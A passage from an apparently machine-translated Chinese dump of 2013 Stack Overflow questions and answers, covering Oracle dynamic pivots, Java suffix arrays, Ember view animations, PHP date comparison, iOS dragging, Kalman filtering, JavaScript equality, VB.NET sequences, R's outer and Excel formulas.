               ORDER BY page, ranked) LOOP
      -- build dynamic query here
   END LOOP;
   OPEN l_rc FOR '
      SELECT *
        FROM (SELECT qv.respnr, sq.question_id, qv.question_value
                FROM survey_question sq, question_values qv
               WHERE qv.question_id = sq.question_id
                 AND sq.survey_id = 1
               ORDER BY qv.respnr, page, ranked) 
               PIVOT ( MAX (question_value) --<-- pivot_clause
                       FOR question_id --<-- pivot_for_clause
                        IN (' || l_dynamic_query || ')
                      )';
    -- process l_rc (LOOP..FETCH..CLOSE)
END; 
```

您也可以使用[`DBMS_SQL`](http://docs.oracle.com/cd/E11882_01/appdev.112/e25519/dynamic.htm#BHCIBJBG).

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-26T15:40:07.497

由于必须知道 a 中的列`pivot`，因此您需要使用动态 SQL 来生成结果。我通常使用 ref_cursor 生成一个过程来执行与此类似的任务：

```
CREATE OR REPLACE procedure dynamic_pivot_q(p_cursor in out sys_refcursor)
as
    sql_query varchar2(8000) := 'select qv.respnr ';

    begin
        for x in (select distinct question_id, mname from meta_question order by 1)
        loop
            sql_query := sql_query ||
                ' , max(case when mq.question_id = '||x.question_id||' then qv.question_value else null end) as "c'||x.mname||'"';

                dbms_output.put_line(sql_query);
        end loop;

        sql_query := sql_query || ' from meta_question mq  
                                    left join survey_question sq 
                                      on mq.question_id = sq.question_id  
                                      and sq.survey_id = 1  
                                    inner join question_values qv 
                                      on qv.question_id = sq.question_id 
                                      and sq.survey_id = 1 
                                    group by qv.respnr';

        dbms_output.put_line(sql_query);

        open p_cursor for sql_query;
    end;
/ 
```

然后您可以通过以下方式执行它（*注意：这是我在 TOAD 中使用的代码*）：

```
variable x refcursor
exec dynamic_pivot_q(:x)
print x 
```

# java - 如何将字符串拆分为后缀数组？

> ID：15092630
> 
> 赞同：4
> 
> 时间：2013-02-26T15:14:41.143
> 
> 标签：java, arrays, search, phrase

将字符串拆分为其后缀数组的最有效方法是什么？

假设您有字符串“天气很好”，我想生成一个后缀数组，如下所示：

```
[0] = "nice"

[1] = "is nice"

[2] = "weather is nice"

[3] = "the weather is nice" 
```

我可以从头到尾访问其标记（单词）的迭代器形式的字符串。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-02-26T15:16:39.593

使用 将数组拆分为空格`split`，然后从后到前遍历生成的标记，取前一个后缀，并将当前标记放在其前面。如果没有前置后缀，请使用空字符串：

```
String str = "quick brown fox jumps over the lazy dog";
List<String> res = new ArrayList<String>();
String last = null;
String[] tok = str.split(" ");
for (int i = tok.length-1 ; i >= 0 ; i--) {
    if (last == null) {
        last = tok[i];
    } else {
        last = tok[i] + " " + last;
    }
    res.add(last);
}
for (String s : res) {
    System.out.println(s);
} 
```

这打印

```
dog
lazy dog
the lazy dog
over the lazy dog
jumps over the lazy dog
fox jumps over the lazy dog
brown fox jumps over the lazy dog
quick brown fox jumps over the lazy dog 
```

[链接到 ideone 上的演示。](http://ideone.com/vzK0kb)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-26T15:19:46.283

显而易见的解决方案是在空格上标记字符串并`ListArray<String>`以相反的顺序存储结果。然后从中建立你的答案`ListArray`，一点递归对灵魂有好处..

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-26T15:20:05.257

调用 .split(" "); 将返回字符串中的单词数组。

[文档](http://docs.oracle.com/javase/6/docs/api/java/lang/String.html#split%28java.lang.String%29)

# ember.js - 在 Emberjs 中销毁之前的动画视图

> ID：15092632
> 
> 赞同：6
> 
> 时间：2013-02-26T15:14:43.483
> 
> 标签：ember.js

目前没有办法在 Ember 中延迟视图销毁。当您想在销毁视图之前对其进行动画处理时，这会出现问题。

所以，我目前有这个非常丑陋的解决方法：

```
willDestroyElement: ->
  $clone = @$().clone().addClass "animate-destruction"
  @$().parents(':first').prepend $clone
  setTimeout ->
    $clone.off().remove()
  , 350 
```

注意：动画是`.animate-destruction`在css的类中完成的。

我知道我的方法不好，所以我想知道是否有人提出了更好的方法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-26T15:31:33.533

这只是我的一个自发的想法：

这是 Ember.View 中 destroyElement 的实现（[链接到源代码](https://github.com/emberjs/ember.js/blob/v1.0.0-rc.1/packages/ember-views/lib/views/view.js#L1634)）：

```
 destroyElement: function() {
    return this.currentState.destroyElement(this);
  }, 
```

您可以尝试覆盖此方法来制作动画：

```
destroyElement: function() {
    var completeCallback = function(){
        return this.currentState.destroyElement(this);
    }
    this.$().fadeOut(completeCallback); //or whatever animation
}, 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-06-29T11:45:53.253

尝试这个

```
Ember.Route.extend({
actions: {
willTransition: function(transition) {
        $.each(Ember.View.views, function(index, value) {
            var popUpView = value.get('classNames').find(function(item) {
                return item == '[nameofyourclass]';
            });
            if(!Em.isEmpty(popUpView) && value.get('visible')) {
                value.set('visible', false);
                value.get('controller').set('previousTransition', transition);
                transition.abort();
            }
        });
        return true;
},
 }
    });

Ember.View.extend({
classNames: ['nameofyourclass'],
classNameBindings: ['visible:element-visible'],

visible: false,

didInsertElement: function() {
    var t = this,
            controller = this.get('controller');
    this.$()
    .on('transitionend webkitTransitionEnd oTransitionEnd MSTransitionEnd', function() {
        if(!t.get('visible')) {
            var previousTransition = controller.get('previousTransition');
            if(!Em.isEmpty(previousTransition)) {
                controller.set('previousTransition', null);
                previousTransition.retry();
            } else { // fallback
                controller.transitionToRoute('index');
            }
        }
    });
    Em.run.next(this, function() {
        this.set('visible', true);
    });
},
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-01-09T14:57:55.460

我处理预销毁动画的首选方法是使用`Em.Evented`. 让视图侦听在方法或操作中调用的事件，该事件将开始销毁视图并延迟销毁，直到事件触发的方法完成（使用运行循环）。例如：

```
SomeView = Em.View.extend({

  _listen: function() {
    this.get('controller').on('closeChildView', this, this.hide);
  }.on('willInsertElement'),

  hide: function() {
    this.$().fadeOut(this.get('controller.duration'));
  }

}); 
```

然后在控制器中：

```
Em.ObjectController.extend(
  Em.Evented, { // Important mixin!

  duration: 500,

  actions: {
    removeSomeChildView: function() {
      this.trigger('closeChildView');

      Em.run.later(this, function() {
        // Then do the stuff to destroy the view here.
      }, this.get('duration'));
    }
  }

}); 
```

或者，您可以使用视图中的`this.removeFromParent()`方法来合并视图的隐藏和删除。

如果销毁实际上是在视图本身中开始的，则可以在调用销毁方法之前使用这些相同的原则，`.on('willDestroyElement')`并在删除视图后需要回调时使用将操作发送到控制器或路由。

预销毁动画可以以相同的方式通过运行`this.$().hide`然后`didInsertElement`使用`show()`方法来转换视图元素来完成。

## 对齐 JS 和 CSS 过渡时间

如果您在 CSS 中进行所有转换，您需要确保 CSS 和 JS 之间的转换时间是一致的。这很简单。在您的视图中，确保 CSS 转换发生在视图的元素上，然后：

```
SomeView = Em.View.extend({
  transitionDuration: Em.computed.alias('controller.transitionDuration'),

  setTransitionDuration: function() {
    var ms = parseFloat(this.$().css('transition-duration')) * 1000; // In milliseconds

    if (ms) {
      this.set('transitionTime', ms);
    }
  }.on('didInsertElement'),
}); 
```

这将更新视图和控制器上的过渡持续时间，以匹配您在 CSS 中编写的任何内容。您在控制器上指定的任何值`transitionDuration`都是后备值，如果您想在覆盖默认 JS 之前进行一些验证`transitionDuration`，您可以在上述方法中添加一个。`if ()``transitionDuration`

# ibm-connections - 关于 IBM Connection 4 OAuth

> ID：15092633
> 
> 赞同：0
> 
> 时间：2013-02-26T15:14:45.030
> 
> 标签：ibm-connections

我通读了 IBM connection 4 wiki：[http](http://www-10.lotus.com/ldd/lcwiki.nsf/xpDocViewer.xsp?lookupName=IBM+Connections+4.0+documentation) ://www-10.lotus.com/ldd/lcwiki.nsf/xpDocViewer.xsp?lookupName=IBM+Connections+4.0+documentation并尝试开发一个第三方应用程序来访问 IBM使用 OAuth 连接受保护的数据。我像这样注册了应用程序（[http://www-10.lotus.com/ldd/lcwiki.nsf/xpDocViewer.xsp?lookupName=IBM+Connections+4.0+documentation#action=openDocument&res_title=Registering_an_OAuth_client_with_a_provider_ic40&content=pdcontent。](http://www-10.lotus.com/ldd/lcwiki.nsf/xpDocViewer.xsp?lookupName=IBM+Connections+4.0+documentation#action=openDocument&res_title=Registering_an_OAuth_client_with_a_provider_ic40&content=pdcontent.)）但我没有找到如何获取这四个密钥：CONSUMER_KEY、CONSUMER_SECRET、ACCESS_TOKEN、TOKEN_SECRET。有任何想法吗？谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-04T13:14:04.240

当您注册您的应用程序时，您提供了密钥标签和令牌

你只需要打印clientSecret。

# php - PHP - 使用 DateTime 对象确定日期是否在未来

> ID：15092639
> 
> 赞同：30
> 
> 时间：2013-02-26T15:14:54.013
> 
> 标签：php, datetime

我正在尝试使用对象确定日期是否在未来，`DateTime`但它总是返回积极的：

```
$opening_date = new DateTime($current_store['openingdate']);
$current_date = new DateTime();
$diff = $opening_date->diff($current_date);
echo $diff->format('%R'); // +

if($diff->format('%R') == '+' && $current_store['openingdate'] != '0000-00-00' && $current_store['openingdate'] !== NULL) {
    echo '<img id="openingsoon" src="/img/misc/openingsoon.jpg" alt="OPENING SOON" />';
} 
```

问题是它总是积极的，所以图像在不应该出现的时候显示。

我一定是在做一些愚蠢的事情，但它是什么，它让我发疯！

* * *

## 回答 #1

> 赞同：81
> 
> 时间：2013-02-26T15:18:54.277

这比你想象的要容易。您可以与[DateTime](http://php.net/datetime)对象进行比较：

```
$opening_date = new DateTime($current_store['openingdate']);
$current_date = new DateTime();

if ($opening_date > $current_date)
{
  // not open yet!
} 
```

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2013-02-26T15:17:54.540

你不需要一个`DateTime`对象。试试这个：

```
$now = time();
if(strtotime($current_store['openingdate']) > $now) {
     // then it is in the future
} 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2013-02-26T15:20:50.307

您可以将 DateTime 对象与通常的比较运算符进行比较：

```
 $date1 = new DateTime("");                                                   
  $date2 = new DateTime("tomorrow");

  if ($date2 > $date1) {
      echo '$date2 is in the future!';
  } 
```

对于您当前的代码，请尝试以下操作：

```
$opening_date = new DateTime($current_store['openingdate']);
$current_date = new DateTime();

if ($opening_date > $current_date) {
    echo '<img id="openingsoon" src="/img/misc/openingsoon.jpg" alt="OPENING SOON" />';
} 
```

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2018-07-03T03:14:37.500

```
$opening_date = new DateTime('2018-07-04');
$current_date = new DateTime();

   if ($opening_date > $current_date) {
      echo "future date";
   } 
```

# iphone - 将 UIImageView 从 UIScrollView 拖到另一个视图

> ID：15092643
> 
> 赞同：1
> 
> 时间：2013-02-26T15:15:15.093
> 
> 标签：iphone, ios, uiscrollview, cgpoint

我有 UIScrollView 包含许多 UIImageViews。我需要将 UIImage 从 UIScrollView 拖到另一个视图。但是我的代码仅在 UIScrollView 中拖动。我无法将图像拖动到 scrollView 之外。请帮助我..我的代码是..

```
for (int i = 0; i < [myArray count]; i++) {
  image = [[UIImageView alloc]initWithFrame:CGRectMake(0, y, 75, 30)];
  image.userInteractionEnabled = YES;
  image.backgroundColor = [UIColor blueColor];

  UIPanGestureRecognizer *panRecg = [[UIPanGestureRecognizer alloc]initWithTarget:self action:@selector(labelDragged:)];
  [image addGestureRecognizer:panRecg];
  y=y+35;

  [gScrollView addSubview:image];
}

-(void)labelDragged:(UIPanGestureRecognizer *)recognizer {
  UIImageView *imageView = (UIImageView *)recognizer.view;
  CGPoint newCenter = [recognizer translationInView:self.view];

  if([recognizer state] == UIGestureRecognizerStateBegan) {     
    beginX = imageView.center.x; 
    beginY = imageView.center.y;
  }

  newCenter = CGPointMake(beginX + newCenter.x, beginY + newCenter.y);

  [imageView setCenter:newCenter];
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-26T15:47:16.060

几点观察：

1.  将其拖出滚动视图时，您希望将其从滚动视图中移除并将其添加到例如`self.view`. 然后，您将`addSubview`相应地调整坐标：

    ```
    newCenter = [self.view convertPoint:newCenter fromView:imageView.superview];
    [self.view addSubview:imageView];
    imageView.center = newCenter; 
    ```

2.  确保`clipsToBounds`将滚动视图设置为 NO，以便在将其拖出时可以继续看到它。

3.  请注意，我已将其更改为引用`imageView.superview`而不是滚动视图。如果您在其中保留滚动视图引用，则必须添加条件检查以确保图像视图尚未从滚动视图中移出。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-26T15:51:49.847

这是拖动的方法

```
-(void)labelDragged:(UIPanGestureRecognizer *)recognizer {

{
        UIImageView *imageView=(UIButton *)[recognizer view];
        CGPoint newCenter = [recognizer translationInView:self.view];
        if (recognizer.state==UIGestureRecognizerStateBegan) {
            CGRect rect=[self.view convertRect:[imageView frame] fromView:[imageView superview]];
            beginX = imageView.center.x; 
            beginY = imageView.center.y;
            [vew setFrame:rect];
            [self.view addSubview:vew];
        }
        else
        {
            CGRect rect=imageView.frame;
            newCenter.x=(newCenter.x+Begin.x);
            newCenter.y=(newCenter.y+Begin.y);
            imageView.center=newCenter;
            if (CGRectIntersectsRect(rect, [AcceptingView frame])) {
                [AcceptingView setBackgroundColor:[UIColor lightGrayColor]];//Notifying that the AcceptingView will accept the icon
            }
            else
            {
                //change back to old color
            }
        }
        if (recognizer.state==UIGestureRecognizerStateEnded)
        {
            CGRect rect=[imageView frame];
            if (CGRectIntersectsRect(rect, [AcceptingView frame])) {
                  //your method of adding the Image to acceptView
                 CGRect rect=[acceptView bounds];
                 rect.size=imageView.frame.size;
                 imageView.frame=rect;
                 [AcceptingView addSubView:imageView];
            }
            else//else part is means for if user drop the dragged view somewhere else other than AcceptingView
            {
                   //add image back to scrollView
            }
        }
    } 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-26T15:46:13.483

我在评论中有几个 UI 问题要问你，但@Rob 是正确的，让视图在层次结构中移动的关键是在层次结构中实际移动它。当拖动开始...

```
CGRect newFrame = [gScrollView convertRect:imageView.frame toView:self.view];
imageView.frame = newFrame;
[self.view addSubview:imageView]; 
```

手势识别器应该保持不变。

# android - 位置跟踪 - 带有计步器和 WIFI 的 Sigma Point Kalman 滤波器

> ID：15092644
> 
> 赞同：3
> 
> 时间：2013-02-26T15:15:18.227
> 
> 标签：android, math, statistics, kalman-filter

我正在使用 android 构建一个室内位置跟踪应用程序。

我已经成功实现了一个计步器，它可以计算步数并将它们转换为上一次 WIFI/GPS 修复的变化，以便更准确地跟踪用户在建筑物内的位置。

计步器就像魅力一样，我得到了非常准确的结果，但是，当获得新的 WIFI 修复时，路径变得不准确和跳跃。

我在网上搜索并阅读了许多论文和案例研究，我发现我需要某种过滤器来平滑结果。

我已经缩小范围，我需要使用粒子滤波器或 Sigma-Point 卡尔曼滤波器（或扩展卡尔曼滤波器）

我已经阅读了很多关于这些过滤器的文章，我已经在 UDACITY.com 上观看了课程，但我仍然无法理解。

简而言之，我的计步器输出是基于手机标题的步骤的新纬度和经度，WIFI位置管理器输出也是纬度和经度。

有人可以简要说明我应该做些什么来使新的 WIFI 修复平滑到我当前的计步器路径吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-26T16:03:44.910

要使用卡尔曼滤波器（线性或扩展），您需要：

1.  定义你的状态空间：大概这是人的位置和速度（经验法则：如果你实际测量它，只包括加速度）。您可能可以在纬度/经度坐标中执行此操作，而不必担心非线性，因为人们不会走那么远。
2.  定义您的测量空间：即您的传感器告诉您什么以及它与状态空间的关系。
3.  定义植物噪声模型：确定目标的真实运动特征；通常这只是一个协方差矩阵，从统计上描述目标的运动如何在观察之间发生变化。
4.  定义测量噪声模型：估计传感器报告的数据中的误差；同样，这是一个统计模型，通常用测量误差的协方差来表示。

我的猜测是您的问题来自（4）：您没有对基于计步器的子系统和基于 GPS 固定的子系统的测量误差进行适当的建模。

在您的问题上尝试基本的线性卡尔曼滤波器也可能值得尝试；所涉及的数学不太复杂，可以或多或少地用作黑匣子（一旦你定义了上面的模型）；扩展方法（sigma-point KF 或粒子滤波）通常需要更多针对问题域的调整。

# javascript - 在 javascript 中使用 if(someBoolean) 与 if(someBoolean==true)

> ID：15092646
> 
> 赞同：2
> 
> 时间：2013-02-26T15:15:20.613
> 
> 标签：javascript, boolean

我想知道在弱类型语言（如 javascript）中是否存在显着差异

```
var someBool=true;
if (someBool==true){
    //Somecode
} 
```

或者只是使用

```
if(someBool){
  //Somecode
} 
```

执行速度是否存在差异，或者是否存在一些语义差异，或者只是一个优于另一个？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-26T16:01:30.453

语义差异相当大，具体如下：

```
if (x) 
```

具有语义：

*   确定 的值`x`。
*   如果值为 undefined、null、零、NaN、空字符串或 false，则条件被认为是 false，否则被认为是 true。

`if (x==true)`

具有语义：

*   确定 的值`x`。
*   如果值为真，则条件为真。
*   如果值为假，则条件为假。
*   否则，假装用户实际写了

`if (x==1)`

并重新开始。

我不打算通过所有逻辑来确定表达式是否等于 1。如果您想了解详细信息，可以阅读 ECMAScript 规范修订版 3 的第 11.9.3 节。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-26T15:18:58.183

是的，有一点语义差异。如果您有不同类型的`==`值（例如[，布尔值与数字比较中的 JavaScript 真实性](https://stackoverflow.com/q/6640637/1048572)，[Javascript If 语句的语义是什么](https://stackoverflow.com/q/1615969/1048572)），则比较会做得更多，而`if`只检查[真实性](https://stackoverflow.com/q/10401297/1048572)。

然而，如果`someBool`总是知道是一个布尔值，你不应该*与*比较`true`，而总是使用第二个变体。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-26T15:28:30.510

如果您想检查它`someBool`是否为`true`，请使用严格相等比较器 ( `===`)：

```
var someBool = 1;

someBool == true;  // true
someBool === true; // false 
```

这也适用于其他类型：

```
0 == "0";  // true
0 === "0"; // false 
```

`==`正如其他人指出的那样，测试相等性（使用）或测试“真实性”（使用 just ）是有区别的`if()`。这绝对值得了解，但我个人尽量避免编写含义不是 100% 清楚的代码。给定变量 ( `someBool`) 的名称，我会期望一个布尔值，所以我会测试一个布尔值。如果我想知道它是否大于`0`，我会改为测试 ( `someNumber >== 0`)。

至于性能；严格相等比较器通常比 using[快](http://jsperf.com/triple-equals-vs-double-equals/3)`==`一点，但差异可以忽略不计。真实性测试可能会更快一些，但这仍然是一个微优化，很少值得麻烦。

# tfsbuild - 由于项目参考，项目构建在 TFS azure 上失败

> ID：15092654
> 
> 赞同：0
> 
> 时间：2013-02-26T15:15:40.583
> 
> 标签：tfsbuild, azure-devops

MVC Web 应用程序解决方案无法在 TFS azure (.visualstudio.com) 上构建，因为项目引用了另一个共享库项目。构建日志：

```
Build started 2/26/2013 12:53:17 AM.
    Project "C:\a\src\Development\[Main Project].sln" on node 1 (default targets).
    ValidateSolutionConfiguration:
      Building solution configuration "Debug|Any CPU".
    C:\a\src\Development\[Main Project].sln.metaproj : error MSB3202: The project file "C:\a\src\Development\..\..\[Sub Project Root]\Development\[Sub Project]\[Sub Project].csproj" was not found. 
```

有什么想法可以解决这个问题吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-11-06T15:55:23.993

我建议您将项目文件 .csproj 添加到源代码控制中，部署在云上

# android - KSOAP2 - HttpTransportSE.call（调用（SOAP_ACTION，信封）上的 IllegalStateException

> ID：15092656
> 
> 赞同：2
> 
> 时间：2013-02-26T15:15:45.013
> 
> 标签：android, android-ksoap2

我正在尝试使用 ksoap2 使用 Web 服务，这是调用

```
 public String startDelivery() {
    final String METHOD_NAME = "startDelivery";
    final String SOAP_ACTION = "the URL to the webMethod";

    SoapObject request = new SoapObject(NAMESPACE, METHOD_NAME);

    PropertyInfo propInfo = new PropertyInfo();
    propInfo.setName("userid");
    propInfo.setType(PropertyInfo.STRING_CLASS);
    propInfo.setValue("1");

    request.addProperty(propInfo);
    SoapSerializationEnvelope envelope = new SoapSerializationEnvelope(
            SoapEnvelope.VER11);

    envelope.setOutputSoapObject(request);
    HttpTransportSE androidHttpTransport = new HttpTransportSE(URL);
    try {
        androidHttpTransport.call(SOAP_ACTION, envelope);
        SoapObject  resultsRequestSOAP = (SoapObject) envelope.getResponse();
        return resultsRequestSOAP.toString();
    } catch (IOException e) {
        e.printStackTrace();
    } catch (XmlPullParserException e) {
        e.printStackTrace();
    }
    return null;
} 
```

但我收到了这个错误

```
 SoapFault - faultcode: 'S:Server' faultstring: 'java.lang.IllegalStateException'  faultactor: 'null' detail: null at org.ksoap2.serialization.SoapSerializationEnvelope.parseBody(SoapSerializationEnvelope.java:141)   at org.ksoap2.SoapEnvelope.parse(SoapEnvelope.java:140) at org.ksoap2.transport.Transport.parseResponse(Transport.java:116)at org.ksoap2.transport.HttpTransportSE.call(HttpTransportSE.java:259) 
```

我没有想法请帮助谢谢

# javascript - 在单个函数中重叠 AJAX 请求

> ID：15092662
> 
> 赞同：0
> 
> 时间：2013-02-26T15:15:51.783
> 
> 标签：javascript, ajax

如果 foo 被快速连续调用两次以致第二次调用发生在收到第一个响应之前，它是否安全？如果安全，您能否解释一下正确的“param”值如何与正确的“xmlHttp”响应匹配的机制？

```
function foo (param)
{
    var xmlHttp = GetXmlHttpRequestObject();

    xmlHttp.onreadystatechange = function()
    {
        if (xmlHttp.readyState == 4 && xmlHttp.status == 200)
        {
            // do something involving param and xmlHttp.responseXML
        }
    }

    xmlHttp.open("GET", "GetAsyncData.ashx", true);
    xmlHttp.send();
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-26T15:22:19.923

`var xmlHttp`绑定到函数`foo`范围。每次调用该函数时，`xmlHttp`都会设置一个新函数。对于函数参数，同样会发生。参数也以相同的方式绑定到函数范围`var xmlHttp`。因此，在这种情况下，每次调用函数时，the`param`和 the`xmlHttp`都是绑定到同一个作用域的变量，这就是每个变量都`param`将匹配到正确`xmlHttp`响应的原因。

有关更多信息，请阅读有关 javascript 闭包的信息。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-26T15:17:10.580

`var`将变量范围限定为函数。对该函数的每次调用都会创建一个具有该名称的新变量。

# vb.net - 如何确定一个数组或一系列变量是否按顺序出现？

> ID：15092664
> 
> 赞同：1
> 
> 时间：2013-02-26T15:16:03.063
> 
> 标签：vb.net

我有 7 个数值，零或更大，按一周中的每一天排序。少至一个或多于所有的值可能大于零。我需要一种方法来确定 >0 值是否出现在单个序列中。

例如：

```
0, 8, 8, 0, 0, 0, 0 
```

将是一个序列，而

```
8, 0, 8, 8, 8, 0, 0 
```

有两个单独的序列，因此不符合条件。如果整个分组中只有一个大于零的值，我也希望它被视为一个合格序列。

我从一个函数开始，它接受 7 个变量并根据每个变量是零还是非零将它们填充到一个布尔数组中——0 为假，> 0 为真，这给了我类似的东西

```
{false, true, true, false, false, false, false} 
```

我现在需要确定该数组的内容是否包含上述限定条件的限定序列。有任何想法吗？

对于它的价值，这是我迄今为止的功能：

```
Public Function IsConcurrent(D1, D2, D3, D4, D5, D6, D7) As Boolean
  Dim arr(6) As Single
  arr(0) = D1
  arr(1) = D2
  arr(2) = D3
  arr(3) = D4
  arr(4) = D5
  arr(5) = D6
  arr(6) = D7

  Dim concurrent As Boolean = False
  If CSng(arr(0)) > 0 Then concurrent = True
  For k = 2 To 7
    If arr(k - 1) = arr(k - 2) Then
    Else
    End If
  Next

  Return concurrent
End Function 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-26T15:46:26.720

...我使用`Lists`而不是数组编写了这个，但结构将是相同的。

我是这样做的：

```
Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
    Dim x As List(Of Integer) = {0, 0, 8, 8, 8, 0, 0}.ToList

    Dim Test As Boolean = LookForSingleSequence(x)
End Sub

Private Function LookForSingleSequence(ByVal MyList As List(Of Integer)) As Boolean

    Dim i As Integer
    Dim RetVal As Boolean = False
    Dim SeqEnded As Boolean = False

    For i = 0 To MyList.Count - 1
        If MyList(i) > 0 Then
            If SeqEnded = True Then
                RetVal = False
                Exit For
            Else
                RetVal = True
            End If
        End If

        If RetVal = True And MyList(i) <= 0 Then SeqEnded = True
    Next

    Return RetVal

End Function 
```

希望这可以帮助！！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-26T16:12:26.843

这是 LINQ 解决方案 - 代码行更少，希望更容易理解：

```
Sub Main()
  Dim lst As New List(Of Integer)({0, 8, 8, 0, 0, 0, 0})
  Console.WriteLine(IsConcurrent(lst)) 'True
  lst = New List(Of Integer)({8, 0, 8, 8, 8, 0, 0})
  Console.WriteLine(IsConcurrent(lst)) 'False
  Console.ReadLine()
End Sub

Private Function IsConcurrent(ByVal lst As List(Of Integer)) As Boolean
  Dim elementsAfterZeros = lst.SkipWhile(Function(x) x <= 0)
  If elementsAfterZeros.Count = 0 Then Return False 'we only have zeros
  Dim elementsInSecondGroupOfNonZeros = elementsAfterZeros.
                                        SkipWhile(Function(x) x > 0).
                                        SkipWhile(Function(x) x <= 0)
  If elementsInSecondGroupOfNonZeros.Count = 0 Then Return True
  Return False
End Function 
```

# r - 如何根据下标逐个元素地分配矩阵中的值？

> ID：15092666
> 
> 赞同：3
> 
> 时间：2013-02-26T15:16:12.780
> 
> 标签：r

我定义了 2 个数值向量，如下所示：

```
> x <- c(1,2)
> y <- c(1,2) 
```

现在我想要一个 2x2 矩阵，例如通过添加元素`x`并`y`基于它们的索引来填充，所以最终结果应该如下所示：

```
 [,1] [,2]
[1,]    2    3
[2,]    3    4 
```

使用嵌套的 for 循环来实现这一点是微不足道的，但不会在非常大的数据集上执行。试图用例如矢量化它

```
> z <- matrix(nrow=2, ncol=2)
> z[x,y] <- x + y 
```

失败，因为`+`运算符在对 .进行赋值之前将`x`和作为向量添加。使用带索引的显式下标也会失败：`y``z``i``j`

```
> i <- 1:2
> j <- 1:2
> z[i,j] <- x[i] + y[j]
> z
     [,1] [,2]
[1,]    2    2
[2,]    4    4 
```

有没有办法使用矢量化/下标来实现我想要的，或者我是否仅限于嵌套的 for 循环或应用函数之一？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-26T15:18:23.307

也许您正在寻找`outer` 功能？

```
outer(x,y,"+") 
```

这使 ：

```
 [,1] [,2]
[1,]    2    3
[2,]    3    4 
```

# excel - Excel，如何从另一列中找到给定值的最高列值

> ID：15092670
> 
> 赞同：2
> 
> 时间：2013-02-26T15:16:29.113
> 
> 标签：excel, pivot-table

**国家 倡议 1 倡议 2 倡议 n 周**

国家 1 状态 1 状态 1 状态 1 1

国家 2 状态 2 状态 2 状态 2 1

国家 1 状态 3 状态 2 状态 1 2

国家 2 状态 3 状态 2 状态 2 2

我有一个 excel 文件，我在其中收集每个国家的倡议状态，它们每周收集一次（有倡议评估的历史）我想建立一个数据透视图来按国家显示当前的倡议状态，但是在这个表结构中无法更改结构只能在 excel 中进行修改）我不能这样做（或者我不知道如何），因为启动器被用作标题。

所以我想将表格转换成这种结构：

倡议状态国家周

倡议 1 状态 1 国家 1 1

倡议 1 状态 2 国家 2 2

是否有可能 - 我认为转置 excel 功能不会做我想要的。

我想在倡议列中列出所有倡议，然后在列状态中显示每个国家的最高状态

所以我需要一个函数来查看倡议列并获得给定国家的最高地位。

任何帮助表示赞赏

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-26T16:18:15.733

您可以为此使用数组公式。它可能不是最好的解决方案，但它会专门解决您的问题。您所做的是，不是为每一行制作一个公式，而是为每个行公式制作一个公式。自己尝试更容易。

假设您的国家名称在 A 列中，而在 B 列中的倡议。您的数组公式看起来像

=MAX(IF((A:A)="CountryName"; (B:B); 0))

这意味着如果 A 中的行值等于您正在查看的国家/地区的名称，则公式将添加 B 列的值，即主动性。然后它将继续到下一行并为此执行相同的操作。完成搜索后，它将显示提取行的最高值。您可以对每个国家/地区重复此操作，但我建议您只需使用一张新纸，在一列中写下所有可能的国家/地区名称，然后将 ="CountryName" 替换为对该单元格的引用。

编辑：重要的是，当你写完公式时，你必须按 Ctrl + Shift + Enter，否则 excel 将无法理解它是一个数组公式。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-26T15:22:47.107

使用数据透视表，您可以将数据库中的列标签用作数据透视图中的行标签。

选择数据库时，请确保选择所有现有数据，包括列的标签（国家、倡议、周等）。然后，当您选择创建数据透视表时，您可以从过滤器、列标签、行标签和值中进行选择。如果您将倡议作为行标签，您可以这样做。另一种方法是只使用过滤器功能/功能区，它允许您同时从多个列上的多个方法中进行排序。

# java - 如何使用Java在函数中查找未知数学变量的值

> ID：15092673
> 
> 赞同：0
> 
> 时间：2013-02-26T15:16:40.893
> 
> 标签：java, mathematical-expressions

我正在尝试解决这个函数形式的数学问题：

f(x) = c [1] x [1] + c [2] x [2] + q [1] x [1] ² + q [2] x [1] x [2] + q [3] x [2] ²

现在我创建了一个界面，用户可以在其中输入 c [1]、 c [2]、 q [1]、 q [2]和 q [3的值]

现在我们需要求解这个函数是 x [1]和 x [2]的值被代入方程。在算法的其他部分，x [1]和 x [2]的值通常以 x [1] = (0 - 0.8ρ [1] ) 和 x [2] = (0 - 0.6ρ [1] )的形式结束

现在假设用户将 c [1]、c [2]、q [1]、q [2]和 q [3]的值分别键入为 0、2、-1、2 和 -2，这将使函数显示为：

f(x) = 0x [1] + 2x [2] + -1x [1] ² + 2x [1] x [2] + -2x [2] ²

这可以重写为：

f(x) = 2x [2] - 1x [1] ² + 2x [1] x [2] - 2x [2] ²

现在，如果我们在上面的等式中替换 x [1] = (0 - 0.8ρ [1] ) 和 x [2] = (0 - 0.6ρ [1] )，我们将得到：

